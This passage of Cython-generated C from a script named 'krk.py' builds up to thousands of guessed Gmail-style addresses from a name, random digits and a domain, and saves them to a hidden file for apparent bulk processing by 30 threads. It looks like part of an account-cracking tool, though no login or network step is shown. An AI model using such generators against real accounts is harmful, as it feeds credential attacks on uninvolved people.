    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 297, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":298
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
 *                 linex()
 *                 last = input(' Put last name: ')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print(' Example: @gmail.com , @yahoo.com etc...')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_last = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "krk.py":299
 *                 linex()
 *                 last = input(' Put last name: ')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 print(' Example: @gmail.com , @yahoo.com etc...')
 *                 linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_linex); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 299, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 299, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":300
 *                 last = input(' Put last name: ')
 *                 linex()
 *                 print(' Example: @gmail.com , @yahoo.com etc...')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 domain = input(' domain: ')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__58, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 300, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":301
 *                 linex()
 *                 print(' Example: @gmail.com , @yahoo.com etc...')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 domain = input(' domain: ')
 *                 linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_linex); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 301, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 301, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":302
 *                 print(' Example: @gmail.com , @yahoo.com etc...')
 *                 linex()
 *                 domain = input(' domain: ')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 try:
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__59, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 302, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_domain = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "krk.py":303
 *                 linex()
 *                 domain = input(' domain: ')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 try:
 *                         limit=int(input(' Put limit: '))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_linex); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 303, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 303, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":304
 *                 domain = input(' domain: ')
 *                 linex()
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit=int(input(' Put limit: '))
 *                 except ValueError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      /* "krk.py":305
 *                 linex()
 *                 try:
 *                         limit=int(input(' Put limit: '))             # <<<<<<<<<<<<<<
 *                 except ValueError:
 *                         limit = 5000
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__60, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 305, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 305, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_v_limit = __pyx_t_3;
      __pyx_t_3 = 0;

      /* "krk.py":304
 *                 domain = input(' domain: ')
 *                 linex()
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit=int(input(' Put limit: '))
 *                 except ValueError:
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "krk.py":306
 *                 try:
 *                         limit=int(input(' Put limit: '))
 *                 except ValueError:             # <<<<<<<<<<<<<<
 *                         limit = 5000
 *                 linex()
 */
    __pyx_t_4 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_4) {
      __Pyx_AddTraceback("krk.gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 306, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);

      /* "krk.py":307
 *                         limit=int(input(' Put limit: '))
 *                 except ValueError:
 *                         limit = 5000             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print(' Getting gmails...')
 */
      __Pyx_INCREF(__pyx_int_5000);
      __Pyx_XDECREF_SET(__pyx_v_limit, __pyx_int_5000);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":304
 *                 domain = input(' domain: ')
 *                 linex()
 *                 try:             # <<<<<<<<<<<<<<
 *                         limit=int(input(' Put limit: '))
 *                 except ValueError:
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    __pyx_L8_try_end:;
  }

  /* "krk.py":308
 *                 except ValueError:
 *                         limit = 5000
 *                 linex()             # <<<<<<<<<<<<<<
 *                 print(' Getting gmails...')
 *                 lists = ['3','4']
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_linex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 308, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_3, };
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 308, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":309
 *                         limit = 5000
 *                 linex()
 *                 print(' Getting gmails...')             # <<<<<<<<<<<<<<
 *                 lists = ['3','4']
 *                 for xd in range(limit):
 */
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":310
 *                 linex()
 *                 print(' Getting gmails...')
 *                 lists = ['3','4']             # <<<<<<<<<<<<<<
 *                 for xd in range(limit):
 *                         lchoice = random.choice(lists)
 */
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 310, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_3);
  __Pyx_GIVEREF(__pyx_kp_s_3);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_3);
  __Pyx_INCREF(__pyx_kp_s_4);
  __Pyx_GIVEREF(__pyx_kp_s_4);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_4);
  __pyx_v_lists = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  /* "krk.py":311
 *                 print(' Getting gmails...')
 *                 lists = ['3','4']
 *                 for xd in range(limit):             # <<<<<<<<<<<<<<
 *                         lchoice = random.choice(lists)
 *                         if '3' in lchoice:
 */
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 311, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
    __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1); __pyx_t_8 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_8 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 311, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 311, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 311, __pyx_L1_error)
        #else
        __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 311, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      } else {
        if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 311, __pyx_L1_error)
        #else
        __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 311, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      }
    } else {
      __pyx_t_2 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_2)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 311, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_2);
    }
    __Pyx_XDECREF_SET(__pyx_v_xd, __pyx_t_2);
    __pyx_t_2 = 0;

    /* "krk.py":312
 *                 lists = ['3','4']
 *                 for xd in range(limit):
 *                         lchoice = random.choice(lists)             # <<<<<<<<<<<<<<
 *                         if '3' in lchoice:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 312, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 312, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_10);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_10, function);
        __pyx_t_4 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_v_lists};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 312, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    }
    __Pyx_XDECREF_SET(__pyx_v_lchoice, __pyx_t_2);
    __pyx_t_2 = 0;

    /* "krk.py":313
 *                 for xd in range(limit):
 *                         lchoice = random.choice(lists)
 *                         if '3' in lchoice:             # <<<<<<<<<<<<<<
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 */
    __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_3, __pyx_v_lchoice, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 313, __pyx_L1_error)
    if (__pyx_t_11) {

      /* "krk.py":314
 *                         lchoice = random.choice(lists)
 *                         if '3' in lchoice:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))             # <<<<<<<<<<<<<<
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         else:
 */
      __pyx_t_2 = __pyx_pf_3krk_5gmail_genexpr(NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 314, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_10 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 314, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF_SET(__pyx_v_mail, ((PyObject*)__pyx_t_10));
      __pyx_t_10 = 0;

      /* "krk.py":315
 *                         if '3' in lchoice:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')             # <<<<<<<<<<<<<<
 *                         else:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
 */
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__62, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_first, __pyx_n_s_lower); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_13 = NULL;
      __pyx_t_4 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_13)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_13);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
          __pyx_t_4 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_13, };
        __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 315, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      }
      __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_last, __pyx_n_s_lower); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __pyx_t_14 = NULL;
      __pyx_t_4 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_13);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_13, function);
          __pyx_t_4 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_14, };
        __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 315, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      }
      __pyx_t_13 = PyNumber_Add(__pyx_t_2, __pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = PyNumber_Add(__pyx_t_13, __pyx_v_mail); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyNumber_Add(__pyx_t_12, __pyx_v_domain); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = PyNumber_Add(__pyx_t_13, __pyx_kp_s__25); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyNumber_Add(__pyx_t_12, __pyx_v_first); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = PyNumber_Add(__pyx_t_13, __pyx_kp_s__22); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = PyNumber_Add(__pyx_t_12, __pyx_v_last); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = PyNumber_Add(__pyx_t_13, __pyx_kp_s__63); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = NULL;
      __pyx_t_4 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_13)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_13);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
          __pyx_t_4 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_13, __pyx_t_12};
        __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 315, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      }
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

      /* "krk.py":313
 *                 for xd in range(limit):
 *                         lchoice = random.choice(lists)
 *                         if '3' in lchoice:             # <<<<<<<<<<<<<<
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 */
      goto __pyx_L13;
    }

    /* "krk.py":317
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         else:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))             # <<<<<<<<<<<<<<
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         fo = open('.re.txt', 'r').read().splitlines()
 */
    /*else*/ {
      __pyx_t_10 = __pyx_pf_3krk_5gmail_3genexpr(NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_3 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF_SET(__pyx_v_mail, ((PyObject*)__pyx_t_3));
      __pyx_t_3 = 0;

      /* "krk.py":318
 *                         else:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')             # <<<<<<<<<<<<<<
 *                         fo = open('.re.txt', 'r').read().splitlines()
 *                 with tred(max_workers=30) as Sabir:
 */
      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__62, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_first, __pyx_n_s_lower); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 318, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_13);
      __pyx_t_2 = NULL;
      __pyx_t_4 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_13);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_13, function);
          __pyx_t_4 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_2, };
        __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 318, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      }
